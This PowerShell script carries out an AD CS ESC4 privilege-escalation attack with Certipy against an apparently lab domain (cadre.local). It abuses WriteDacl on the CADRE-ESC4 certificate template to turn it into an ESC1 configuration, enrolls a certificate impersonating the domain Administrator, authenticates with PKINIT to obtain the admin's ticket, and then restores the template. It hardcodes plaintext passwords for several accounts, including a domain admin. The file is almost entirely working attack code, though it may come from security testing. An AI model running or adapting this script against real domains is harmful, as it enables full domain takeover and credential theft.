# Branch B - ESC4 (CADRE-ESC4 WriteDacl by Engineering-Cadre = lead_engineering)
# Flow: backup template -> write-default-configuration (ESC1) -> enroll as victim -> restore
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# admin SID
$adminSid = $null
try {
  $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://192.168.77.10/CN=Administrator,CN=Users,DC=cadre,DC=local", "chief_command@cadre.local", "C0mm@nd_Ch1ef!")
  $de.RefreshCache()
  if ($de.Properties["objectSid"].Count -gt 0) { $adminSid = (New-Object System.Security.Principal.SecurityIdentifier($de.Properties["objectSid"][0],0)).Value }
} catch { Write-Output "ldap_err=$($_.Exception.Message)" }
Write-Output "administrator_sid=$adminSid"

Write-Output "===== STEP 1: backup CADRE-ESC4 config (as lead_engineering) ====="
Remove-Item C:\Tools\cadre-attack\esc4-backup.json -ErrorAction SilentlyContinue
& $certpy template -template CADRE-ESC4 -u "lead_engineering@cadre.local" -p "Eng_L3ad!" -dc-ip 192.168.77.10 -save-configuration C:\Tools\cadre-attack\esc4-backup.json 2>&1 | Select-Object -Last 10
Write-Output "backup_rc=$LASTEXITCODE"

Write-Output "===== STEP 2: modify CADRE-ESC4 to ESC1 config (as lead_engineering) ====="
& $certpy template -template CADRE-ESC4 -u "lead_engineering@cadre.local" -p "Eng_L3ad!" -dc-ip 192.168.77.10 -write-default-configuration -force 2>&1 | Select-Object -Last 10
Write-Output "modify_rc=$LASTEXITCODE"

Write-Output "===== STEP 3: enroll admin cert with modified CADRE-ESC4 (as hunter_dfir) ====="
Remove-Item C:\Tools\cadre-attack\esc4* -ErrorAction SilentlyContinue
& $certpy req -u "hunter_dfir@cadre.local" -p "DF1R_Hunt3r!" -ca cadre-CA -target dc01.cadre.local -template CADRE-ESC4 -upn administrator@cadre.local -sid $adminSid -dynamic-endpoint -timeout 25 -out C:\Tools\cadre-attack\esc4 2>&1 | Select-Object -Last 10
Write-Output "req_rc=$LASTEXITCODE"
$p4 = Get-ChildItem C:\Tools\cadre-attack\*esc4*.pfx -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
Write-Output "esc4_pfx=$p4"
if ($p4) {
  Write-Output "===== STEP 3b: certipy auth (PKINIT + UnPAC) ====="
  del /q C:\Tools\cadre-attack\administrator.ccache 2>$null
  & $certpy auth -pfx $p4 -dc-ip 192.168.77.10 -domain cadre.local 2>&1 | Select-Object -Last 12
  Write-Output "auth_rc=$LASTEXITCODE"
} else { Write-Output "ESC4_NO_PFX" }

Write-Output "===== STEP 4: RESTORE CADRE-ESC4 config (as chief_command DA) ====="
Get-Process certipy -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
if (Test-Path C:\Tools\cadre-attack\esc4-backup.json) {
  & $certpy template -template CADRE-ESC4 -u "chief_command@cadre.local" -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -write-configuration C:\Tools\cadre-attack\esc4-backup.json -force 2>&1 | Select-Object -Last 10
  Write-Output "restore_rc=$LASTEXITCODE"
} else { Write-Output "NO_BACKUP - RESTORE SKIPPED" }

Write-Output "===== ESC4_DONE ====="
